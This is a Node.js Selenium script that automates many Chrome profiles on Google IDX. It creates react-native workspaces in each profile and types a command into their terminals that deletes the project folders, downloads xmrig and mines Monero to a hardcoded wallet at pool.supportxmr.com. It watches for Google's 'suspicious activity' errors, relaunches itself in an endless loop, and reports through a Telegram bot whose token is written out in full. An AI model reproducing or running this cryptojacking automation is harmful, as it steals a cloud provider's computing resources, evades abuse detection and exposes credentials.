

const { Builder, By, Key, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const path = require('path');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');

const openChrome = async (port, profilePath) => {
  let remoteDebugCmd = ''
  if (process.platform === 'win32') {
    const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
    // const profilePath = path.resolve(__dirname, 'profile', profile);
    remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}"`;
  } else {
    const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
    // const profilePath = path.join(__dirname, 'profile', profile);
    remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}"`;
  }
  return new Promise((resolve, reject) => {
    console.log('Executing:', remoteDebugCmd);
    exec(remoteDebugCmd, (error) => {
      if (error) {
        console.error(`Error launching Chrome: ${error.message}`);
        reject(error);
      } else {
        console.log('Chrome launched with remote debugging');
        resolve();
      }
      console.log('Chrome launched with remote debugging');
    });
  });
}

const wait = (min, maxPlus) => new Promise(resolve => setTimeout(resolve, (min + maxPlus * Math.random()) * 1000))
async function sendTelegramMessage(botToken, chatId, message) {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      }
    );

    if (response.data && response.data.ok) {
      console.log('Message sent to Telegram successfully');
      return true;
    } else {
      console.error('Failed to send Telegram message:', response.data);
      return false;
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
    return false;
  }
}

// =====================================
// run.js

// Define your bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7668129713:AAGGfomtEre-W2QH0r1FUPL1Z9pKSd0KMlQ';
// const TELEGRAM_CHAT_ID = '1140704410';
const TELEGRAM_CHAT_ID = '-4750007696'; // group chat id


const getMainTargetLinks = async (driver) => {

  await driver.get('https://idx.google.com');
  console.log('Navigated to https://idx.google.com');

  const mainTargetLinks = [];
  // Wait for the page to load and main-target elements to be present
  await driver.wait(until.elementsLocated(By.css('.main-target')), 20 * 1000)
    .catch(() => {
      console.log('No .main-target elements found within timeout period');
      return mainTargetLinks;
    });
  console.log('Page loaded and .main-target elements are present');
  // Get list of links with class "main-target"
  const mainTargetElements = await driver.findElements(By.css('.main-target'));

  // Extract href attributes from found elements
  for (const element of mainTargetElements) {
    try {
      const href = await element.getAttribute('href');
      mainTargetLinks.push({ href });
    } catch (error) {
      console.error('Error getting href attribute:', error.message);
    }
  }
  return mainTargetLinks.reverse();
}
const connectChrome = async (port) => {

  let options = new chrome.Options();
  options.options_['debuggerAddress'] = 'localhost:' + port;

  let driver = await new Builder()
    .forBrowser('chrome')
    .setChromeOptions(options)
    .build();

  return driver;

}
const createNewProfileIfCan = async (driver, mainTargetLinks, name) => {
  if (mainTargetLinks.length < 10) {//dnd_test
    for (let i = mainTargetLinks.length; i < 10; i++) {
      try {
        // Navigate to the new project page
        await driver.get('https://idx.google.com/new/react-native');

        // Wait for and fill the input field
        await driver.wait(until.elementLocated(By.css('#mat-input-0')), 30000);
        await driver.findElement(By.css('#mat-input-0')).sendKeys(`${name}-w${i}-`);
        await driver.findElement(By.css('#mat-input-0')).sendKeys('\uE007'); // Enter key

        // Wait for iframe to load
        await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 60000);

        // No need to close this page, we'll navigate away
        console.log(`Created new project ${name}-w${i}-`);
      } catch (error) {
        console.log('Error creating new page with Selenium');
        break;
      }
    }
  }

}

const closeOtherTabs = async (driver) => {
  const currentHandle = await driver.getWindowHandle();
  const allHandles = await driver.getAllWindowHandles();
  for (const handle of allHandles) {
    if (handle !== currentHandle) {
      await driver.switchTo().window(handle);
      await driver.close();
    }
  }

  await driver.switchTo().window(currentHandle);
}
const checkGG = async (driver, name, port) => {
  try {
    let err = '';
    await driver.wait(until.elementLocated(By.css('.error-section.callout.severity-error.is-loud')), 10000);
    const errorElement = await driver.findElement(By.css('.error-section.callout.severity-error.is-loud p'));
    const errorMessage = await errorElement.getText();

    if (errorMessage) {
      console.log('Error message:', errorMessage);
      if (errorMessage.includes('detected suspicious activity')) {
        // await saveErrProfile(path.join(__dirname, 'error_profile.txt'), `${name}_${port}`);
        err = 'suspicious';
      }
      await sendTelegramMessage(
        TELEGRAM_BOT_TOKEN,
        TELEGRAM_CHAT_ID,
        `Máy #_${name}_# profile ${port} #tails${port} ⚠️ Error detected with Selenium::: ${errorMessage}`
      );
      return err;
    }
  } catch (error) {
    console.error('Error in checkDie with Selenium:', error);
    return 'error';
  }
}

/**
 * Runs commands in a terminal using Selenium WebDriver
 * @param {WebDriver} driver - Selenium WebDriver instance
 * @param {string} name - The name to use in the command
 */
const runCMDWithSelenium = async (driver, name) => {
  try {
    console.log('Running command with Selenium...');
    await driver.wait(until.elementLocated(By.css('.the-iframe.is-loaded')), 30 * 1000);
    console.log('Pressed============');
    await wait(30, 3);
    console.log('Pressed============1');
    await driver.actions()
      .keyDown(Key.CONTROL)
      .sendKeys('`')
      .keyUp(Key.CONTROL)
      .perform();
    await driver.actions()
      .keyDown(Key.CONTROL)
      .sendKeys('c')
      .keyUp(Key.CONTROL)
      .perform();
    console.log('Pressed Control+C with Selenium');

    await new Promise(resolve => setTimeout(resolve, 100));
    const commands = [
      "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2",
      " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
      " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
      " && cd xmrig-6.22.2",
      " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];
    for (const cmd of commands) {
      await driver.actions().sendKeys(cmd).perform();
    }
    await driver.actions().sendKeys('\uE007').perform(); // Enter key
    console.log('Commands executed with Selenium');
    const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
    await driver.actions().sendKeys(cmd).perform();
    await driver.actions().sendKeys('\uE007').perform(); // Enter key
    // 
    await new Promise(resolve => setTimeout(resolve, 10 * 1000));
    console.log('Commands executed with Selenium');
    // await driver.switchTo().defaultContent();
  } catch (error) {
    console.error('Error in runCMDWithSelenium:', error);
  }
}
const restartProfile = async (driver, links, port) => {
  let check = false;
  for (const link of links) {
    // Get the worker name from the URL
    const location = link.href.split('/');
    const workerName = location[location.length - 1];
    console.log('open links:', link);
    await driver.get(link.href);
    if (!check) {
      check = true;
      const err = await checkGG(driver, workerName, port);
      if (err === 'suspicious') {
        await driver.quit();
        throw new Error('Suspicious activity detected');
      }
    }
    console.log('Resetting link with Selenium:', link.href);


    // Wait for iframe to load
    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 8 * 60 * 1000);
    console.log('loaded =============:');

    // Run commands
    await runCMDWithSelenium(driver, workerName);

    // Set a timer to close this after some time (not directly applicable in Selenium)
    // We'll just proceed to the next link
    console.log(`${workerName} done with Selenium`);

    // Wait a bit before moving to the next link
    await wait(5, 10);
  }


};

const runProfile = async (port, name) => {
  const driver = await connectChrome(port);
  const listLink = await getMainTargetLinks(driver)
  await createNewProfileIfCan(driver, listLink, name);
  // await closeOtherTabs(driver);

  const listNewLink = await getMainTargetLinks(driver);

  if (!listNewLink || listNewLink.length === 0) return;
  await restartProfile(driver, listNewLink, port);

  return listLink;
}


const killChromeProcess = (name) => {
  return new Promise((res, rej) => {
    if (process.platform === 'win32') {
      return exec('taskkill /IM chrome.exe /F', () => res());
    } else {
      return exec('killall "Google Chrome"', () => res());
    }
  })
};



const runAllProfile = async (machine, profilePath) => {
  try {
    await new Promise(resolve => setTimeout(resolve, 3 * 1000));
    const fileList = readDirectory(profilePath);
    for (const element of fileList) {
      try {
        const name = element.slice(-4);
        const count = +name - 9220;
        await runTerminal(`${machine}-p${count}`, count, runPath);
        await new Promise(resolve => setTimeout(resolve, 3 * 1000));
      } catch (error) {
        console.error('Error in runTerminal:', error);
      }
    }
  }
  catch (error) {
    console.error('Error in main:', error);
    await killChromeProcess().catch(console.error);
  }
}

function readDirectory(directoryPath) {
  console.log(`Reading files in: ${directoryPath}\n`);
  try {
    // Get all files and directories in the current directory
    const items = fs.readdirSync(directoryPath);

    items.forEach(item => {
      const itemPath = path.join(directoryPath, item);
      const stats = fs.statSync(itemPath);

      if (stats.isDirectory()) {
        console.log(`📁 Directory: ${item}`);
      } else {
        console.log(`📄 File: ${item} (${(stats.size / 1024).toFixed(2)} KB)`);
      }
    });

    return items;
  } catch (error) {
    console.error(`Error reading directory: ${error.message}`);
    return [];
  }
}

async function connectToDebugChrome(name, port) {
  console.log('Connecting to debug Chrome on port:', name, port);

  // const count = process.argv[3] ? parseInt(process.argv[3], 10) : 1;
  // const port = parseInt((9220 + count), 10);
  // const name = process.argv[2] || `dnd`;
  const profilePath = path.join(__dirname, 'profile', `chrome-profile${port}`);
  openChrome(port, profilePath);
  await new Promise(resolve => setTimeout(resolve, 3 * 1000));
  await runProfile(port, name);
  killChromeProcess().catch(console.error);
};

// connectToDebugChrome();
const main = async () => {
  const machineName = process.argv[2] || `dnd`;
  const profilePath = path.join(__dirname, 'profile');
  const fileList = readDirectory(profilePath);
  for (const element of fileList) {
    try {
      const port = element.slice(-4);
      console.log('port:', port);
      // const count = +name - 9220;
      await connectToDebugChrome(`${machineName}-p${port}`, port).catch(console.error);
      await new Promise(resolve => setTimeout(resolve, 3 * 1000));
    } catch (error) {
      console.error('Error in runTerminal:', error);
    }
  }
  setTimeout(() => {
    console.log('_____________________________restart', new Date().toLocaleTimeString());
    main();
  }
    , 5 * 1000);

}
main();